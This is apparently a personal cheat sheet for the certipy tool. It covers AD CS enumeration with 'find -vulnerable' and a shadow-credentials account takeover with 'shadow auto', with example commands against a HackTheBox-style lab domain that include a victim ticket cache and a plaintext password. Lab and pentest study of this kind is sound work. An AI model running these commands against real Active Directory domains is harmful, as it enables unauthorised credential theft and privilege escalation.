# certipy

## Overview

## Usage

### Find

The find command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations. The find operation searches for vulnerabilities such as missing or misconfigured certificates, insecure settings, or issues with Kerberos encryption types.

    -scheme <scheme>: This specifies which scheme should be used to communicate with the target Domain Controller.
    -k: The -k flag indicates that Kerberos authentication should be used for the request. Certipy will attempt to authenticate with the Kerberos tickets that are either provided or found in the Kerberos ticket cache
    -debug: The -debug flag enables debugging output.
    -target <target_name>.<domain_name>: DNS name of the target
    -dc <ip>: Domain Controller ip.
    -vulnerable: This flag tells Certipy to look for vulnerabilities related to Kerberos and Active Directory certificate configurations.
    -stdout: The -stdout flag indicates that Certipy should print its results to standard output, rather than saving them to a file.

```
KRB5CCNAME=$PWD/<victim_username_with_TGT>.ccache certipy-ad find -scheme <scheme> -k -debug -target <target_dns_name> -dc-ip <domain_controller_ip> -vulnerable -stdout
```

Example: KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.129.251.172 -vulnerable -stdout

### Shadow Credentials

```
certipy-ad shadow auto -u <username>@<domain_name> -p '<password>' -dc-ip <domain_controller_ip> -ns <dns_server_ip> -target <domain_controller_name>.<domain_name> -account <username_victim>
```

Example : certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc